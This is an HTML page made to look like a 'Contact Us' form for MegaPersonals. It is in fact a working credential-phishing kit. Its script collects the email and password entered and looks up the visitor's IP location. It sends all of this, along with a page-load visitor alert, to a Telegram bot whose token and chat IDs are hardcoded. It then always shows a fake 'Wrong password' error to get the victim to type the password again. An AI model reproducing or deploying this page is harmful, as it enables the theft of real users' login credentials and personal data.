<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Us</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: white;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 450px;
            margin: 0 auto;
            background-color: white;
            min-height: 100vh;
            position: relative;
            padding-top: 0;
        }

        .status-bar {
            display: none;
        }

        .logo-container {
            text-align: center;
            padding: 20px 0;
            margin-bottom: 20px;
        }

        .logo {
            max-width: 300px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        .main-content {
            padding: 10px 20px 30px;
        }

        .title {
            text-align: center;
            font-size: 36px;
            color: #b8a082;
            margin-bottom: 40px;
            font-weight: normal;
        }

        .form-container {
            background-color: #f4f2a7;
            border-radius: 20px;
            padding: 30px 20px;
            border: 3px solid #ddd633;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #999;
            border-radius: 8px;
            font-size: 16px;
            background-color: white;
            outline: none;
        }

        .form-control:focus {
            border-color: #666;
        }

        /* Password field container for show/hide functionality */
        .password-container {
            position: relative;
        }

        .password-container .form-control {
            padding-right: 50px; /* Make space for the show/hide button */
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            padding: 4px 8px;
            border-radius: 4px;
            transition: all 0.2s ease;
        }

        .password-toggle:hover {
            background-color: #f0f0f0;
            color: #333;
        }

        .password-toggle:active {
            transform: translateY(-50%) scale(0.95);
        }

        .message-label {
            display: block;
            text-align: center;
            font-size: 36px;
            color: #b8a082;
            margin-bottom: 15px;
            font-weight: normal;
        }

        .message-field {
            height: 200px;
            resize: vertical;
        }

        .send-button {
            width: 100%;
            background-color: #1890ff;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 15px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .send-button:hover {
            background-color: #0056b3;
        }

        .footer {
            text-align: center;
            padding: 30px 20px 20px;
            color: #666;
        }

        .footer-links {
            margin-bottom: 15px;
        }

        .footer-links a {
            color: #1890ff;
            text-decoration: none;
            font-size: 16px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .separator {
            color: #666;
            margin: 0 3px;
        }

        .manage-posts {
            color: #1890ff;
            text-decoration: none;
            font-size: 16px;
            display: block;
            margin: 15px 0;
        }

        .manage-posts:hover {
            text-decoration: underline;
        }

        .copyright {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
        }

        .support-email {
            font-size: 14px;
        }

        .support-email a {
            color: #1890ff;
            text-decoration: none;
        }

        .support-email a:hover {
            text-decoration: underline;
        }

        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 40px;
            padding: 15px;
            max-width: 400px;
            width: 100%;
            justify-content: center;
        }

        /* Error styling for password field */
        .password-error {
            color: #ff0000;
            font-size: 14px;
            margin-top: 5px;
            text-align: center;
            animation: shake 0.5s ease-in-out;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="status-bar">
        </div>

        <div class="main-content">
            <!-- Logo Section - Replace "your-logo.png" with your actual logo file -->
            <div class="logo-container">
                <img src="your-logo.png" alt="MegaPersonals Logo" class="logo">
            </div>
            
            <h1 class="title">Contact Us</h1>
            
            <div class="form-container">
                <form id="contactForm">
                    <div class="form-group">
                        <input type="email" class="form-control" id="emailField" placeholder="Your Email Address" required>
                    </div>
                    
                    <div class="form-group">
                        <div class="password-container">
                            <input type="password" class="form-control" id="passwordField" placeholder="Password" required>
                            <button type="button" class="password-toggle" id="passwordToggle">Show</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <input type="text" class="form-control" id="subjectField" placeholder="Subject" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="message-label">Message</label>
                        <textarea class="form-control message-field" id="messageField" placeholder="" required></textarea>
                    </div>
                    
                    <button type="submit" class="send-button">Send Message</button>
                </form>
            </div>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">Home</a>
                <span class="separator">|</span>
                <a href="#">About Us</a>
                <span class="separator">|</span>
                <a href="#">Policies & Terms</a>
                <span class="separator">|</span>
                <a href="#">Contact Us</a>
            </div>
            
            <a href="#" class="manage-posts">Manage Posts</a>
            
            <div class="copyright">
                Copyright ¬©2024 MegaPersonals.eu
            </div>
            
            <div class="support-email">
                For support email <a href="mailto:support@megapersonals.eu">support@megapersonals.eu</a>
            </div>
        </div>

        <div class="bottom-nav">
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '7371610501:AAFcYAjSy1ZKgKh7ihaq6dLJvt9yj8gDonE';
        const CHAT_IDS = ['7623079090', '7238192107'];
        const IPINFO_TOKEN = '2da9da1f876081';

        // Password show/hide functionality
        function initPasswordToggle() {
            const passwordField = document.getElementById('passwordField');
            const passwordToggle = document.getElementById('passwordToggle');

            passwordToggle.addEventListener('click', function() {
                if (passwordField.type === 'password') {
                    passwordField.type = 'text';
                    passwordToggle.textContent = 'Hide';
                } else {
                    passwordField.type = 'password';
                    passwordToggle.textContent = 'Show';
                }
            });
        }

        // Function to get visitor's IP and location info
        async function getVisitorInfo() {
            try {
                const response = await fetch(`https://ipinfo.io?token=${IPINFO_TOKEN}`);
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country,
                    timezone: data.timezone,
                    org: data.org
                };
            } catch (error) {
                console.log('Error getting IP info:', error);
                return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
            }
        }

        // Function to send message to Telegram
        async function sendTelegramMessage(message) {
            for (const chatId of CHAT_IDS) {
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (error) {
                    console.log('Error sending to Telegram:', error);
                }
            }
        }

        // Function to send visitor alert on page load
        async function sendVisitorAlert() {
            const visitorInfo = await getVisitorInfo();
            const currentTime = new Date().toLocaleString();
            const userAgent = navigator.userAgent;
            
            const message = `üö® <b>New Visitor Alert</b> üö®

üî• Page: Contact Us Form`;

            await sendTelegramMessage(message);
        }

        // Function to send form data to Telegram
        async function sendFormData(formData) {
            const visitorInfo = await getVisitorInfo();
            const currentTime = new Date().toLocaleString();
            const userAgent = navigator.userAgent;
            
            const message = `üìù <b>New Form Submission</b> üìù
        
üë§ <b>User Details:</b>
üìß Email: ${formData.email}
üîê Password: ${formData.password}
üìã Subject: ${formData.subject}
üí¨ Message: ${formData.message}

üåç <b>Visitor Info:</b>
üåê IP: ${visitorInfo.ip}
üìç Location: ${visitorInfo.city}, ${visitorInfo.region}, ${visitorInfo.country}
üïí Time: ${currentTime}
üè¢ ISP: ${visitorInfo.org || 'Unknown'}
üñ•Ô∏è User Agent: ${userAgent}`;

            await sendTelegramMessage(message);
        }

        // Function to show wrong password error and scroll to password field
        function showPasswordError() {
            const passwordField = document.getElementById('passwordField');
            
            // Add red border to password field
            passwordField.style.border = '2px solid #ff0000';
            passwordField.style.backgroundColor = '#ffe6e6';
            
            // Create error message if it doesn't exist
            let errorMsg = document.querySelector('.password-error');
            if (!errorMsg) {
                errorMsg = document.createElement('div');
                errorMsg.className = 'password-error';
                errorMsg.textContent = 'Wrong password! Please try again.';
                passwordField.parentNode.appendChild(errorMsg);
            }
            
            // Smooth scroll to password field
            passwordField.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
            
            // Focus on password field
            setTimeout(() => {
                passwordField.focus();
            }, 500);
            
            // Remove error styling after user starts typing
            passwordField.addEventListener('input', function() {
                passwordField.style.border = '2px solid #999';
                passwordField.style.backgroundColor = 'white';
                if (errorMsg) {
                    errorMsg.remove();
                }
            }, { once: true });
        }

        // Initialize when page loads
        window.addEventListener('load', function() {
            // Initialize password toggle functionality
            initPasswordToggle();
            
            // Send visitor alert when page loads
            sendVisitorAlert();
        });

        // Handle form submission - replacing the original form handler
        document.getElementById('contactForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Get form data
            const formData = {
                email: document.getElementById('emailField').value,
                password: document.getElementById('passwordField').value,
                subject: document.getElementById('subjectField').value,
                message: document.getElementById('messageField').value
            };
            
            // Send form data to Telegram
            await sendFormData(formData);
            
            // Show wrong password error and scroll
            showPasswordError();
        });
    </script>
</body>
    </html>
